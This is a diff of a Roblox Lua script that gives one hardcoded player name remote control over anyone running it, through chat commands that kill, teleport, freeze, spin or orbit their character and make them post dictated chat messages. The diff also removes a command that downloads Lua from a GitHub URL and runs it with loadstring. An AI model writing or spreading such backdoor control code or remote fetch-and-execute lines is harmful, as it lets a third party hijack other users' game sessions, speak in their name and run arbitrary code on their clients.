@@ -8,6 +8,7 @@ if not SayMessageRequest:IsA("RemoteEvent") or not OnMessageEvent:IsA("RemoteEve
 local lp = game:FindService("Players").LocalPlayer
 local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
 local lpName = game:FindService("Players").LocalPlayer.Name
+local owner = game:GetService("Players"):FindFirstChild("Dkailhan_1")
 
 local orbiting = false
 local orbitConnection
@@ -22,7 +23,6 @@ OnMessageEvent.OnClientEvent:Connect(function(data)
         if message == "/kill" and player == "Dkailhan_1" then
             lp.Character.Humanoid.Health = 0
         elseif message == "/bring" and player == "Dkailhan_1" then
-            local owner = game:GetService("Players"):FindFirstChild("Dkailhan_1")
             lp.Character.HumanoidRootPart.CFrame = owner.Character.HumanoidRootPart.CFrame
         elseif message == "/fr" and player == "Dkailhan_1" then
             lp.Character.HumanoidRootPart.Anchored = true
@@ -32,23 +32,22 @@ OnMessageEvent.OnClientEvent:Connect(function(data)
             local toSay = string.sub(message, 6)
             SayMessageRequest:FireServer(toSay, "All")
         elseif string.sub(message, 1, 5) == "/spin" and player == "Dkailhan_1" then
-            local numbertospin = tonumber(string.sub(message, 7))
+            local numbertospin = tonumber(string.sub(message, 7)) or 100
             if hrp then
                 for i = 1, numbertospin do
                     hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(36), 0)
                     task.wait()
                 end
             end
-        elseif message == "/orbit" and player == "Dkailhan_1" then
+        elseif string.sub(message, 1, 6) == "/orbit" and player == "Dkailhan_1" then
+            local radius = tonumber(string.sub(message, 8)) or 10
             if not orbiting then
                 orbiting = true
-                local owner = game:GetService("Players"):FindFirstChild("Dkailhan_1")
                 if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
                     local ownerHRP = owner.Character.HumanoidRootPart
                     orbitConnection = game:GetService("RunService").RenderStepped:Connect(function()
                         if hrp and ownerHRP then
                             local angle = tick() * math.rad(90)
-                            local radius = 10
                             hrp.CFrame = ownerHRP.CFrame * CFrame.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
                         end
                     end)
@@ -62,8 +61,6 @@ OnMessageEvent.OnClientEvent:Connect(function(data)
                     orbitConnection = nil
                 end
             end
-        elseif message == "/resetscript" and player == "Dkailhan_1" then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/piggy.lua"))()
         end
     end)
 end)
